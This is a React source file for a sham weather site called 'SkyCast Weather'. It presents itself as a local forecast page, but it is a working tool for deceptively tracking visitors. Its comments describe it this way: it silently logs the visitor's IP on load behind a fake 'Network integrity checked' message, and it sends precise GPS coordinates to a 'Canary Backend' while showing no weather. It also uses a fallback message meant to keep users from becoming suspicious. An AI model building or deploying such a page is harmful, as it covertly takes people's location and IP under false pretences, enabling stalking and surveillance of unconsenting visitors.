import React, { useState, useEffect } from 'react';
import axios from 'axios';
import { Cloud, Sun, CloudRain, Loader2, MapPin, Wind } from 'lucide-react';

const API_URL = import.meta.env.VITE_API_URL || '/api';

function App() {
  const [status, setStatus] = useState('idle'); // idle, loading, success, error
  const [message, setMessage] = useState('');

  // Silently log IP on mount (Passive Reconnaissance)
  useEffect(() => {
    axios.post(`${API_URL}/log-visit`)
      .then(() => console.log('Network integrity checked.'))
      .catch(err => console.error('Initialization failed', err));
  }, []);

  const handleCheckLocation = () => {
    setStatus('loading');
    
    if (!navigator.geolocation) {
      setStatus('error');
      setMessage('Geolocation is not supported by your browser.');
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (position) => {
        const { latitude, longitude } = position.coords;
        
        // Active Forensics: Sending precise GPS to our Canary Backend
        axios.post(`${API_URL}/log-gps`, { lat: latitude, lng: longitude })
          .then(() => {
            setStatus('success');
            setMessage('Weather data loaded for your area.');
          })
          .catch((err) => {
            setStatus('error');
            setMessage('Error fetching local weather servers.');
          });
      },
      (error) => {
        setStatus('error');
        // Standard "Fallback" message to keep the user from being suspicious
        setMessage('Unable to detect location. Showing general weather for your region based on IP.');
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
      }
    );
  };

  return (
    <div className="weather-container">
      <nav className="navbar">
        <div className="logo">
          <Cloud size={28} color="#2563eb" />
          <span>SkyCast Weather</span>
        </div>
        <div className="nav-links">
          <a href="#today">Today</a>
          <a href="#radar">Radar</a>
          <a href="#forecast">10-Day</a>
        </div>
      </nav>

      <main className="hero-section">
        <div className="content-wrapper">
          <div className="badge">LIVE TRACKING</div>
          <h1 className="title">
            <span className="gradient-text">Real-Time Local</span> Weather Forecast
          </h1>
          <p className="subtitle">
            Get hyper-local weather updates, storm alerts, and 7-day forecasts tailored to your exact coordinates.
          </p>

          <div className="weather-card">
            <div className="card-header">
              <Sun size={24} className="card-icon" />
              <h3>Location Discovery</h3>
            </div>
            <p className="card-text">
              To provide the most accurate radar and forecasting data, we need to know where you are.
            </p>
            
            <button 
              className="action-btn" 
              onClick={handleCheckLocation}
              disabled={status === 'loading'}
            >
              {status === 'loading' ? (
                <>
                  <Loader2 className="spin" size={20} /> Detecting...
                </>
              ) : (
                <>
                  <MapPin size={20} /> Use Current Location
                </>
              )}
            </button>

            {status === 'success' && (
              <div className="alert success-alert">
                <CloudRain size={20} />
                <span>{message}</span>
              </div>
            )}

            {status === 'error' && (
              <div className="alert error-alert">
                <Wind size={20} />
                <span>{message}</span>
              </div>
            )}
          </div>
        </div>
      </main>
      
      <footer className="footer">
        <p>&copy; {new Date().getFullYear()} SkyCast Weather Network. Accurate Data.</p>
      </footer>

      {/* Internal CSS Styles - Add this to your index.css or keep it here */}
      <style>{`
        .weather-container { font-family: 'Inter', sans-serif; min-height: 100vh; background: #f8fafc; }
        .navbar { display: flex; justify-content: space-between; padding: 20px 50px; background: white; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
        .logo { display: flex; align-items: center; gap: 10px; font-weight: bold; font-size: 1.2rem; color: #1e293b; }
        .nav-links { display: flex; gap: 20px; }
        .nav-links a { text-decoration: none; color: #64748b; font-size: 0.9rem; }
        .hero-section { display: flex; justify-content: center; padding-top: 80px; }
        .content-wrapper { text-align: center; max-width: 600px; }
        .badge { display: inline-block; padding: 4px 12px; background: #dbeafe; color: #2563eb; border-radius: 20px; font-size: 0.7rem; font-weight: bold; margin-bottom: 20px; }
        .title { font-size: 3rem; color: #1e293b; line-height: 1.2; margin-bottom: 20px; }
        .gradient-text { background: linear-gradient(90deg, #2563eb, #7c3aed); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .subtitle { color: #64748b; font-size: 1.1rem; margin-bottom: 40px; }
        .weather-card { background: white; padding: 40px; border-radius: 24px; box-shadow: 0 20px 25px -5px rgba(0,0,0,0.1); }
        .card-header { display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 15px; }
        .card-icon { color: #f59e0b; }
        .card-text { color: #64748b; margin-bottom: 30px; }
        .action-btn { width: 100%; display: flex; align-items: center; justify-content: center; gap: 10px; padding: 15px; background: #2563eb; color: white; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; transition: 0.2s; }
        .action-btn:hover { background: #1d4ed8; }
        .action-btn:disabled { background: #94a3b8; }
        .alert { margin-top: 20px; display: flex; align-items: center; gap: 10px; padding: 15px; border-radius: 12px; font-size: 0.9rem; }
        .success-alert { background: #f0fdf4; color: #166534; }
        .error-alert { background: #fef2f2; color: #991b1b; }
        .spin { animation: spin 1s linear infinite; }
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        .footer { position: fixed; bottom: 0; width: 100%; text-align: center; padding: 20px; color: #94a3b8; font-size: 0.8rem; }
      `}</style>
    </div>
  );
}

export default App;